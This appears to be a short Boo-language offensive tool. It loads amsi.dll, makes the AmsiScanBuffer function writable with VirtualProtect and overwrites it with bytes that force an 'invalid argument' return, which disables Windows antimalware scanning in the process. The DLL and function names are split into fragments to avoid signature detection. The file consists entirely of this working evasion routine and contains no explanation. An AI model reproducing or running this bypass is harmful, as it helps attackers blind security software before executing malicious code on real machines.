import System
import System.Runtime.InteropServices

[DllImport("kernel32.dll", SetLastError: true, CharSet: CharSet.Unicode)]
public static def LoadLibrary(lpFileName as string) as IntPtr:
	pass
	
[DllImport("kernel32.dll", CharSet: CharSet.Ansi, ExactSpelling: true, SetLastError: true)]
public static def GetProcAddress(hModule as IntPtr, procName as string) as IntPtr:
	pass
	
[DllImport("kernel32.dll")]
public static def VirtualProtect(lpAddress as IntPtr, dwSize as int, flNewProtect as uint, ref lpfOldProtect as IntPtr) as bool:
	pass

public static def PatchMem(dll as string, function as string, patch as (byte)):
	try:
		oldProtect as IntPtr = 0
		library = LoadLibrary(dll)
		print ""
		print "[>] $(dll) address : $(library)"
		address = GetProcAddress(library, function)
		result = VirtualProtect(address, patch.Length, 0x40, oldProtect)
		Marshal.Copy(patch, 0, address, patch.Length)
		result = VirtualProtect(address, patch.Length, 0x20, oldProtect)
	except:
		print "[!] Error when Patching $(dll) : $(function)"
public static def Main():
	amsi_patch as (byte)
	if IntPtr.Size == 8:
		print "[*] x64"
		amsi_patch = array(byte, [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3])
	else:
		print "[*] x86"
		amsi_patch = array(byte, [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00])
	PatchMem("am"+"si.dll", "Am"+"si"+"Sc"+"anBu"+"ffer", amsi_patch)
	print "[*] Finished"
	print " "
